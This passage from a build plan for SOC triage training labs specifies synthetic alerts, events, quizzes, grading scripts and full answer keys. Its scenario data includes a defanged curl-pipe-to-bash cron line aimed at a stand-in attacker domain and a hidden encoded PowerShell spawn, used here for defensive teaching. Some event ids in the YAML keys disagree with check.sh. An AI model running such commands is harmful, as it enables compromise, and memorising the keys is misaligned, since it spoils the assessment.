  - `cases/c1/events.jsonl` — 5 ECS-normalized events: 4625s for j.walsh (`CM-0311-0138`, 2026-03-11T14:06:12Z), d.okafor (`CM-0311-0139`, 14:11:52Z), t.aoki (`CM-0311-0140`, 14:17:03Z) all from 203.0.113.66; 4624 logon type 3 m.reyes (`CM-0311-0142`, 14:22:31Z); Entra sign-in success m.reyes/OWA with MFA claim ABSENT (`CM-0311-0143`, 14:22:31Z). Verdict evidence = the success events; `event.id` fields carry q1e.
  - `cases/c1/context.txt` — m.reyes not traveling; no change ticket references 203.0.113.66.
  - `cases/c2/alert.json` — `CM-A-12`, rule `CM-R-0134 "Mimikatz command line"`, T1003.001, host WKS-HD-03.
  - `cases/c2/events.jsonl` — 2 events: Sysmon 11 file create `...\Downloads\SecurityAwareness\how-attackers-use-mimikatz.pptx` (`CM-0310-0070`, 2026-03-10T13:14:58Z); 4688 `POWERPNT.EXE` whose `process.command_line` contains that .pptx path — the string "mimikatz" appears ONLY in the filename (`CM-0310-0071`, 13:15:04Z). q2e lives in `event.id` of the 4688.
  - `cases/c2/context.txt` — helpdesk runs monthly security-awareness training; deck downloaded from intranet.
  - `cases/c3/alert.json` — `CM-A-13`, rule `CM-R-0141 "PsExec service installed on domain controller"`, T1569.002, host DC01.
  - `cases/c3/events.jsonl` — 3 events: 4624 type 3 t.aoki→DC01 (`CM-0310-0019`, 2026-03-10T10:00:12Z — canonical CHG-2143 logon, same id as L1.1); Sysmon 1 `PSEXESVC.EXE` on DC01 as t.aoki (`CM-0310-0020`, 10:00:15Z); 4688 msiexec patch install, parent PSEXESVC (`CM-0310-0021`, 10:01:20Z).
  - `cases/c3/context.txt` — CHG-2143 excerpt: implementer t.aoki, task "DC01 patching via PsExec", approved window 2026-03-10 09:00-12:00Z. Timestamps match ⇒ btp.
  - `cases/c4/alert.json` — `CM-A-14`, SAME rule `CM-R-0117` as c1 (deliberate contrast), `entities.source.ip: 192.0.2.150`, 2026-03-10.
  - `cases/c4/events.jsonl` — 3 events: 4625s from 192.0.2.150 for m.reyes (`CM-0310-0092`, 2026-03-10T14:31:05Z), j.walsh (`CM-0310-0093`, 14:31:09Z), d.okafor (`CM-0310-0094`, 14:31:13Z). NO success event.
  - `cases/c4/context.txt` — Bluewater Security engagement letter excerpt: authorized quarterly pentest 2026-03-10, source IP 192.0.2.150.
  - `cases/c5/alert.json` — `CM-A-15`, rule `CM-R-0159 "Office app spawned PowerShell with encoded command" (same rule id as L1.8's CM-A-52)`, T1059.001, host WKS-ACCT-07, user m.reyes.
  - `cases/c5/events.jsonl` — 3 events: Sysmon 1 parent `WINWORD.EXE` → `powershell.exe -nop -w hidden -enc JAB...` (`CM-0311-0201`, 2026-03-11T15:41:07Z — canonical M2 spawn id, matches L1.4/L1.5/L1.8); Sysmon 3 powershell.exe → 203.0.113.66:443 (`CM-0311-0179`, 15:41:31Z); Sysmon 13 Run-key set `HKCU\...\Run\OneDriveUpd` (`CM-0311-0181`, 15:41:35Z).
  - `cases/c5/context.txt` — m.reyes reported "invoice attachment wouldn't open"; no change tickets. (Prose defanged; events raw.)
  - `cases/c6/alert.json` — `CM-A-16`, rule `CM-R-0155 "C2 beaconing - fixed interval"`, T1071, host WKS-HD-03.
  - `cases/c6/events.jsonl` — 3 normalized zeek conn events: 10.20.30.103 → 192.0.2.10:123/udp, 76 bytes, 2026-03-12T10:00:00Z / 10:01:04Z / 10:02:08Z (`CM-0312-0203/-0204/-0205`). Port 123/udp is the tell: NTP, so the C2 claim is wrong ⇒ fp (not btp).
  - `cases/c6/context.txt` — standard workstation build syncs time to corp NTP 192.0.2.10 (w32time config line).
  - `answers.template.txt` — twelve lines `q1=` `q1e=` ... `q6=` `q6e=`.
- **Learner task**: lab.md BRIEF (≤10 lines) pins: the verdict grades the rule's THREAT CLAIM — TP = claimed malicious activity is real; FP = what happened is not the claimed activity (logic/parse/lookalike); BTP = claim correctly identified the behavior but the behavior is authorized (the category new analysts miss; produces tuning feedback, not tickets). GUIDED STEPS: per case read `alert.json` (rule name = the claim) → `events.jsonl` → `context.txt`, then copy `answers.template.txt` to `answers.txt` and fill. Grammar: `qN=` one of `tp|fp|btp`; `qNe=` ONE lowercase event id (`cm-mmdd-nnnn`) from that case that a skeptical Tier 2 would accept as the deciding evidence.
- **Grading** (`check.sh`; key regexes decoded from the base64 block between `# --- BEGIN GENERATED KEY (genevidence: s1-dispositions) ---` markers):
  1. `assert_file_exists answers.txt`
  2. normalize: `tr 'A-Z' 'a-z' < answers.txt | tr -d ' \t' > .graded` (relative paths only)
  3. `assert_file_contains .graded '^q1=tp$'` ; `assert_file_contains .graded '^q1e=(cm-0311-0142|cm-0311-0143)$'`
  4. `assert_file_contains .graded '^q2=fp$'` ; `assert_file_contains .graded '^q2e=cm-0310-0071$'`
  5. `assert_file_contains .graded '^q3=btp$'` ; `assert_file_contains .graded '^q3e=(cm-0310-0019|cm-0310-0020)$'`
  6. `assert_file_contains .graded '^q4=btp$'` ; `assert_file_contains .graded '^q4e=(cm-0310-0092|cm-0310-0093|cm-0310-0094)$'`
  7. `assert_file_contains .graded '^q5=tp$'` ; `assert_file_contains .graded '^q5e=cm-0311-0201$'`
  8. `assert_file_contains .graded '^q6=fp$'` ; `assert_file_contains .graded '^q6e=(cm-0312-0203|cm-0312-0204|cm-0312-0205)$'`
  9. `ck_summary`
- **Kit files**:
  - `meta.json`: `{id:"L1.7", title:(map-exact), type:"TRIAGE", objective:"Assign tp/fp/btp verdicts to six alerts and cite the deciding event id for each", gate:false, est_minutes:20}`.
  - `quiz.json` (3, all choice):
    1. "Case c4: the spray from 192.0.2.150 really happened. Why is the verdict btp and not fp?" A) the rule mis-parsed the logons B) the claimed behavior genuinely occurred but was authorized under the Bluewater engagement letter C) no account was compromised, so it cannot be any kind of positive D) the source IP is internal. **Key: B**.
    2. "Case c6: the 64-second 'beacon' to 192.0.2.10:123. Why fp and not btp?" A) NTP is authorized, and authorized means fp B) the interval is too short for C2 C) btp requires the rule's claim to correctly describe the behavior — here the traffic is NTP, so the C2 claim itself is wrong D) UDP traffic can never be C2. **Key: C**.
    3. "What should closing an alert as btp produce?" A) an incident ticket to Tier 2 B) nothing — close silently C) tuning feedback to detection engineering (e.g. allowlist the change window or authorized source), and no incident ticket D) a password reset for the entities involved. **Key: C**.
  - `hints.json`: L1 "Ask two questions per case, in order: (1) did the behavior the rule NAMES actually happen? (2) if yes, was it authorized? No→fp; yes+unauthorized→tp; yes+authorized→btp. Read context.txt last." L2 "Two cases have paperwork that authorizes real behavior. Two cases matched something other than the named activity — check which executable actually ran (c2) and which well-known port the traffic uses (c6)." L3 "c2: 'mimikatz' appears only inside a .pptx filename in a POWERPNT.EXE command line. c6: UDP/123 is time sync. c3/c4: compare event timestamps and source against CHG-2143 and the engagement letter. For qNe pick the one event a skeptic couldn't argue with."
  - `recap.md` (3 lines, no bullets): "The verdict grades the rule's threat claim: tp means the claimed malicious activity really happened and was not authorized." / "fp means what actually happened is not the claimed activity - a logic, parsing, or lookalike match (a filename, a protocol the rule mistook for C2)." / "btp means the rule correctly caught the behavior but the behavior was authorized - close with tuning feedback, never with an incident ticket."
  - No `recall.json` (not a phase opener).

**EVIDENCE SPEC**
```yaml
scenario: s1-dispositions
window: {start: "2026-03-09T00:00:00Z", end: "2026-03-13T23:59:59Z"}
hosts: {DC01: 10.20.10.5, WKS-ACCT-07: 10.20.30.107, WKS-HD-03: 10.20.30.103}
actors: [m.reyes, d.okafor, j.walsh, t.aoki]
external: {c2: 203.0.113.66, pentest: 192.0.2.150, ntp: 192.0.2.10}
benign_background:
  - {id: chg2143-psexec, at: "2026-03-10T10:02:11Z", actor: t.aoki, target: DC01, ticket: CHG-2143}   # -> c3
  - {id: awareness-deck, at: "2026-03-10T13:15:04Z", host: WKS-HD-03, proc: POWERPNT.EXE,
     file: how-attackers-use-mimikatz.pptx}                                                            # -> c2
  - {id: bluewater-spray, at: "2026-03-10T14:31:05Z", src: 192.0.2.150, kind: 4625-burst,
     users: [m.reyes, j.walsh, d.okafor], success: none}                                               # -> c4
  - {id: ntp-sync, from: "2026-03-12T10:00:00Z", host: WKS-HD-03, dst: "192.0.2.10:123/udp",
     interval_s: 64, count: 3}                                                                         # -> c6
attacker_actions:
  - {id: m1-spray, from: "2026-03-11T14:05:00Z", to: "2026-03-11T14:25:00Z", src: 203.0.113.66,
     fail_users: [j.walsh, d.okafor, t.aoki],
     success: {user: m.reyes, at: "2026-03-11T14:22:31Z", logon_type: 3, entra_mfa_claim: absent}}     # -> c1
  - {id: m2-macro, at: "2026-03-11T15:41:22Z", host: WKS-ACCT-07, user: m.reyes,
     parent: WINWORD.EXE, child: "powershell.exe -nop -w hidden -enc <b64>",
     beacon: "203.0.113.66:443", runkey: "HKCU\\...\\Run\\OneDriveUpd"}                                # -> c5
emit:
  - cases/c1/: [alert.json, events.jsonl, context.txt]  # CM-A-11; CM-0311-0138..0140,0142,0143
  - cases/c2/: [alert.json, events.jsonl, context.txt]  # CM-A-12; CM-0310-0070,0071
  - cases/c3/: [alert.json, events.jsonl, context.txt]  # CM-A-13; CM-0310-0044..0046
  - cases/c4/: [alert.json, events.jsonl, context.txt]  # CM-A-14; CM-0310-0092..0094
  - cases/c5/: [alert.json, events.jsonl, context.txt]  # CM-A-15; CM-0311-0177,0179,0181
  - cases/c6/: [alert.json, events.jsonl, context.txt]  # CM-A-16; CM-0312-0203..0205
  - answers.template.txt
  - check.sh generated-key block (base64 of the answer_key below)
answer_key:
  c1: {verdict: tp,  cite: [cm-0311-0142, cm-0311-0143]}
  c2: {verdict: fp,  cite: [cm-0310-0071]}
  c3: {verdict: btp, cite: [cm-0310-0044, cm-0310-0045]}
  c4: {verdict: btp, cite: [cm-0310-0092, cm-0310-0093, cm-0310-0094]}
  c5: {verdict: tp,  cite: [cm-0311-0177]}
  c6: {verdict: fp,  cite: [cm-0312-0203, cm-0312-0204, cm-0312-0205]}
```

### L1.8 - Phase gate: five alerts - name the telemetry source, the technique, and the evidence you'd pull for each

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L1.8 | Phase gate: five alerts - name the telemetry source, the technique, and the evidence you'd pull for each | DECODE | true | 20 |

Dir: `tracks/soc/phases/p1/L1.8-gate-five-alerts/`

**TEACHING ARTIFACT**

**Files staged (files/):**
- `alerts/CM-A-51.json` .. `alerts/CM-A-55.json` - GENERATED SIEM alerts, contract shape `{alert.id, @timestamp, rule:{id,name,version,severity,risk_score,threat:{tactic,technique}}, entities, evidence:{event_ids,query}, status:"new"}`. In all five, `rule.threat.technique` is `null` ("these rules shipped untagged - tagging them is your job", stated in BRIEF); `tactic` is present. `evidence.query` carries the source answer via an index token (`index=entra_signin` etc.); `evidence.event_ids` carries the grounding ids. The five:
  - **CM-A-51** @2026-03-11T14:23:05Z, rule CM-R-0161 "Successful sign-in without expected MFA claim", sev high/73, tactic credential-access; entities: user m.reyes, app OWA, source.ip 203.0.113.66; query `index=entra_signin result:success mfa:absent`; event_ids [CM-0311-0143] (the entra-signin success record itself — a success-only query has no failure samples to cite; sample failures from the 14:05-14:25Z spray). Key: entra-signin / t1110.003.
  - **CM-A-52** @2026-03-11T15:41:22Z, CM-R-0159 "Office application spawned encoded PowerShell", critical/90, tactic execution; entities: host WKS-ACCT-07, user m.reyes, parent WINWORD.EXE, child `powershell.exe -nop -w hidden -enc ...`; query `index=sysmon event.code:1`; event_ids [CM-0311-0201]. Key: sysmon / t1059.001.
  - **CM-A-53** @2026-03-12T09:14:00Z, CM-R-0171 "High-entropy subdomain burst with NXDOMAIN ratio", high/68, tactic command-and-control; entities: host WKS-ENG-12 10.20.31.112, zone tun.stonewick.example; query `index=zeek_dns`; event_ids [CM-0312-0310, CM-0312-0311, CM-0312-0312]. Key: zeek-dns / t1071.004.
  - **CM-A-54** @2026-03-11T16:12:30Z, CM-R-0181 "Account created and added to Administrators within 60s", high/81, tactic persistence; entities: host FS01, subject m.reyes, target account supportadmin; query `index=win_security event.code:(4720 OR 4732)`; event_ids [CM-0311-0244 (4720), CM-0311-0245 (4732)]. Key: win-security / t1136.001 (local account on FS01 — CM-A-54 is deliberately placed on FS01, not DC01, so the answer is t1136.001 not t1136.002).
  - **CM-A-55** @2026-03-12T20:20:15Z, CM-R-0191 "Cron entry installed during interactive root SSH session", high/77, tactic persistence; entities: host WEB01, user root, source.ip 203.0.113.66; query `index=linux_auth`; event_ids [CM-0312-0455 (sshd accept), CM-0312-0457 (crontab REPLACE), CM-0312-0460 (CRON pam session)]; narrative in lab.md: installed job runs `curl -s hxxp://cdn[.]stonewick[.]example/u.sh | bash` every 10 min. Key: linux-auth / t1053.003.
- `evidence-menu.md` - GENERATED (same scenario emit, so menus can't drift from key). Per alert, three pulls; wrong options are always wrong-host, wrong-plane, or enrichment-instead-of-raw-evidence. Full menus (correct starred, star not shipped):
  - A1: a) whois/geoip 203.0.113[.]66; **b)** raw entra-signin records 14:05-14:25Z for source ip 203.0.113[.]66 across all users, incl. CM-0311-0143; c) Sysmon process events from WKS-ACCT-07 (spray leaves no host activity).
  - A2: **a)** Sysmon event.code 1 on WKS-ACCT-07 ~15:41Z with parent + full child command line; b) zeek-conn egress for WKS-ACCT-07 (doesn't confirm the spawn); c) win-security 4624 for m.reyes on DC01 (wrong host).
  - A3: a) entra-signin for d.okafor (wrong plane); b) dig tun[.]stonewick[.]example live (active enrichment, touches attacker infra); **c)** zeek-dns rows src 10.20.31.112 matching tun[.]stonewick[.]example - name length + NXDOMAIN ratio.
  - A4: **a)** win-security CM-0311-0244/0245 from FS01 plus subject's preceding 4624; b) entra-signin for supportadmin (local account - no cloud plane); c) Sysmon from WKS-ACCT-07 (wrong host).
  - A5: a) whois cdn[.]stonewick[.]example; **b)** WEB01 auth.log 20:15-20:21Z - sshd accept for root from 203.0.113[.]66, crontab REPLACE, CRON session open; c) zeek-conn for the 300s beacon to 203.0.113[.]66:443 (wrong host/thread).
- `sources-catalog.md` - static; the six slugs (this IS the answer vocabulary): `zeek-conn`, `zeek-dns`, `win-security`, `sysmon`, `linux-auth`, `entra-signin`; each: one-line "what it records", plane (network/host/identity), telltale fields, matching `index=` token.
- `attack-excerpt.json` - EXTENDS L1.5's file (same shared file, same `{tid,name,tactic,parent}` schema — not a re-ship, a superset): L1.5's 10 rows plus 6 more rows this gate needs: `t1136`/create account/persistence/null, `t1136.001`/local account/persistence/t1136, `t1136.002`/domain account/persistence/t1136, `t1053`/scheduled task or job/execution/null, `t1053.003`/cron/execution/t1053, `t1053.005`/scheduled task/execution/t1053 — 16 rows total, covering all 5 keyed techniques (t1110.003, t1059.001, t1071.004, t1136.001, t1053.003) plus distractors sharing their tactics.
- `answers.template.txt` - 15 lines `q1a=` .. `q5c=` with a 3-line comment header giving the grammar.

**Learner task:** `cp answers.template.txt answers.txt`; per alert `jq . alerts/CM-A-5N.json`; qNa = source slug from evidence.query index + sources-catalog.md; qNb = technique id the rule's logic detects, via attack-excerpt.json; qNc = letter from evidence-menu.md. Grammar: qNa one catalog slug; qNb lowercase tid (`t1110.003`); qNc one of `a|b|c`. Key: q1a=entra-signin q1b=t1110.003 q1c=b; q2a=sysmon q2b=t1059.001 q2c=a; q3a=zeek-dns q3b=t1071.004 q3c=c; q4a=win-security q4b=t1136.001 q4c=a; q5a=linux-auth q5b=t1053.003 q5c=b.

**Grading (check.sh, sources $LAB_CHECKLIB, collect-all):**
1. `assert_file_exists answers.txt`
2. Normalize once (plain bash, Section 2.1 recipe) to `.answers.norm`; then for each of the 15 keys qNx (q1a..q5c, in order): `assert_file_contains ".answers.norm" "^qNx=<decoded K_QNX>$"` - 15 assertions; `K_*` constants live base64-encoded between `# --- BEGIN GENERATED KEY (genevidence: s1-gate-five-alerts) ---` / `# --- END GENERATED KEY ---`.
3. `ck_summary` (last line). No network, no absolute paths.

**Kit files:**
- meta.json: `{id:"L1.8", title:<map-exact>, type:"DECODE", objective:"Given five alerts, name each one's telemetry source, ATT&CK technique, and the raw evidence to pull", gate:true, est_minutes:20}`
- quiz.json (3, choice, keyed answer base64 in file):
  1. "Order the Phase 1 pipeline." a) adversary action -> telemetry -> log -> normalized event -> detection rule -> alert; b) alert -> rule -> log -> telemetry -> action; c) telemetry -> action -> alert -> normalized event. **Key: a**
  2. "You pick up CM-A-52 to triage. Which direction are you walking the pipeline?" a) forwards, action toward alert; b) backwards, alert toward adversary action; c) you don't - triage only reads the alert. **Key: b**
  3. "CM-R-0181-style logic fires on t.aoki adding an account to a group under change ticket CHG-2143. The rule matched exactly what happened. Disposition?" a) tp; b) fp; c) btp. **Key: c** (rule worked, behavior authorized)
- hints.json: L1: "Each alert's evidence.query names an index, and sources-catalog.md maps planes to slugs - decide identity vs host vs network vs Linux syslog before touching the technique column." L2: "For qNb, filter attack-excerpt.json by the alert's tactic, then match what the RULE's logic actually detects, not the wider story; for qNc the right pull is always raw events on the same host and plane the rule fired on." L3: "A1 fired on a cloud sign-in policy, not a Windows 4624; A4's 4720/4732 are Windows Security codes from FS01; every wrong menu option is wrong-host, wrong-plane, or enrichment-not-evidence - eliminate those three and the letter is what's left."
- recap.md (3 lines): `An alert is the end of a pipeline - adversary action, telemetry, log, normalized event, rule, alert - and triage walks it backwards.` / `Source plus technique tells you exactly which raw evidence to pull; whois and geoip are enrichment, never a substitute for the events in evidence.event_ids.` / `Phase 1 gate passed: five alerts, fifteen keyed answers, all grounded in CM- event ids - Phase 2 puts a live queue in front of you.`
- recall.json: none in this lab (not a phase opener). **Parked draft for L2.1** (per Phase Builder protocol, ships with the p2 build): 1) choice, correct pipeline order (as quiz Q1) - key a - source "L1.1"; 2) choice "svc_backup's 02:00Z robocopy to FS01 trips a mass-file-copy rule - tp/fp/btp?" - key btp - source "L1.7"; 3) text "Which top-level Sigma section combines selections into firing logic?" - key `condition` - source "L1.4"; 4) text "Technique id for WINWORD.EXE spawning powershell.exe -enc?" - key `t1059.001` - source "L1.5"; 5) text "Which alert field lists the raw event ids that let you verify the alert against evidence?" - key `evidence.event_ids` - source "L1.3".

**EVIDENCE SPEC**
```yaml
scenario: s1-gate-five-alerts          # tools/genevidence/s1-gate-five-alerts.yaml
window: {start: "2026-03-09T00:00:00Z", end: "2026-03-13T23:59:59Z"}
actors: [m.reyes, root@WEB01, supportadmin (attacker-created)]
hosts: {WKS-ACCT-07: 10.20.30.107, WKS-ENG-12: 10.20.31.112, FS01: 10.20.10.8, WEB01: 10.20.10.20}
attacker: {c2: 203.0.113.66 c2.stonewick.example, payload: 198.51.100.23 cdn.stonewick.example,
           tunnel_zone: tun.stonewick.example}
benign_background: none emitted (gate ships alerts only; raw logs live in earlier labs)
attacker_actions:
  - {t: "2026-03-11T14:05:00Z/14:25:00Z", act: owa-spray from 203.0.113.66, success: "m.reyes 2026-03-11T14:22:31Z no-mfa (entra event CM-0311-0143)", alert: CM-A-51, event_ids: [CM-0311-0143]}
  - {t: "2026-03-11T15:41:07Z", act: winword-spawns-enc-powershell on WKS-ACCT-07, alert: CM-A-52, event_ids: [CM-0311-0201]}
  - {t: "2026-03-11T16:12:07Z", act: create-local-account supportadmin + add-to-Administrators on FS01, alert: CM-A-54, event_ids: [CM-0311-0244, CM-0311-0245]}
  - {t: "2026-03-12T09:00:00Z+", act: dns-tunnel bursts WKS-ENG-12 -> tun.stonewick.example nxdomain-heavy, alert: CM-A-53, event_ids: [CM-0312-0310, CM-0312-0311, CM-0312-0312]}
  - {t: "2026-03-12T20:15:33Z", act: root-ssh WEB01 from 203.0.113.66, curl cdn.stonewick.example/u.sh | bash, cron install, alert: CM-A-55, event_ids: [CM-0312-0455, CM-0312-0457, CM-0312-0460]}
emit:
  - alerts: [files/alerts/CM-A-51.json, files/alerts/CM-A-52.json, files/alerts/CM-A-53.json,
             files/alerts/CM-A-54.json, files/alerts/CM-A-55.json]   # rule.threat.technique: null in all
  - choice_menus: [files/evidence-menu.md]         # generated with the key so menus never drift
  - answer_key_block: check.sh                     # between BEGIN/END GENERATED KEY markers
answer_key:
  q1a: entra-signin
  q1b: t1110.003
  q1c: b
  q2a: sysmon
  q2b: t1059.001
  q2c: a
  q3a: zeek-dns
  q3b: t1071.004
  q3c: c
  q4a: win-security
  q4b: t1136.001
  q4c: a
  q5a: linux-auth
  q5b: t1053.003
  q5c: b
static_files: [files/sources-catalog.md, files/attack-excerpt.json, files/answers.template.txt]  # not generated
```

## 6. Build order (one session, Phase Builder protocol)

1. `tools/genevidence/` core + `universe.yaml` + `verify.py`; self-test on `s0-fixtures`.
   `universe.yaml` should encode the §2.2 canonical event/rule registry table directly, not
   just as a note — every scenario yaml written afterward imports ids from it rather than
   minting its own.
2. p0 scenarios (`s0-fixtures`, `s0-tier-cases`) → L0.1, L0.2, L0.3 — build using the §2.1
   canonical grading pattern verbatim in every check.sh, self-test (fail path + pass path,
   real outputs pasted into lab.md), commit per lab (`soc L0.x: <title>`).
3. p1 scenarios (`s1-telemetry`, `s1-log-anatomy`, `s1-alert-anatomy`, `s1-sigma-read`,
   `s1-attack-map`, `s1-killchain`, `s1-dispositions`, `s1-gate-five-alerts`) → L1.1–L1.8,
   same per-lab loop. During L1.7's self-test, time it honestly against the 20-minute
   ceiling and apply the §3.5 workload trim (drop `q2e`/`q5e`) only if it's genuinely tight.
4. Close-out: `verify.py` green across all scenarios (including the cross-scenario id-
   collision check §2.2 calls for — identical id ⇒ byte-identical event, otherwise ids must
   be unique); `tools/lint-labs.sh` + `tools/shellcheck-all.sh` + `tests/acceptance.sh`
   green; `lab status`/`resume` render the track; update `planned_execution.md`; tag
   `soc-p0` and `soc-p1`. Before tagging, resolve the §3.5 M3-foothold narrative gap (one
   line in §1, or a retimed L1.1 teaser) — it's not a grading defect but it is a continuity
   hole a learner will notice.

## 7. Acceptance checklist mapping (PROMPTS.md)

- Lab count/titles/types match the map — §4/§5 entries are map-exact.
- Every lab self-tested, real outputs pasted — build-order step rule, per lab.
- shellcheck clean — every check.sh follows the §2.1 canonical pattern (constants + a
  fixed normalize recipe, no ad hoc `assert_cmd_ok` strings); no `disable=` anywhere.
- Gate labs integrative + next-opener recall drafted — L0.3, L1.8 (+ parked L2.1 recall).
- Evidence generated + consistency-verified — §2 generator + `verify.py`, including the
  §2.2 canonical-id imports and the cross-scenario collision check.
- `lab status` renders phase; `resume` works mid-phase — close-out step.
- Independent review complete — §3.5 ledger: 3 blockers and ~20 majors from the 3-critic
  panel resolved in §4/§5; 2 items left as explicit build-time calls (L1.7 pacing, M3
  foothold narrative).
